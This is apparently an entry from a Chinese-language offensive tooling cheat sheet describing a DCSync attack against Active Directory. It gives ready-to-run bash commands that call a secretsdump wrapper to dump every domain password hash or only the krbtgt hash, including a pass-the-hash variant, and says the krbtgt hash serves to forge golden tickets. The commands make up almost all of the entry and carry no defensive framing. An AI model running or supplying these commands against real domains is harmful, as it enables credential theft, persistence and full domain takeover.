### DCSync (secretsdump)

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `凭据导出` `AD` `权限维持` |

## DCSync 攻击导出凭据

### 导出域内所有 Hash
```bash
bash dcsync.sh contoso.com administrator Admin@123 192.168.1.10
```

### 仅导出特定用户 (如 krbtgt) Hash
```bash
bash dcsync.sh contoso.com administrator Admin@123 192.168.1.10 -just-dc-user krbtgt
```

### 使用 NTLM Hash 替代明文密码
```bash
bash dcsync.sh contoso.com administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 192.168.1.10
```

- ✓ 模拟域控进行目录复制
- ✓ 无需直接登录域控
- 用于获取 krbtgt Hash 制作黄金票据
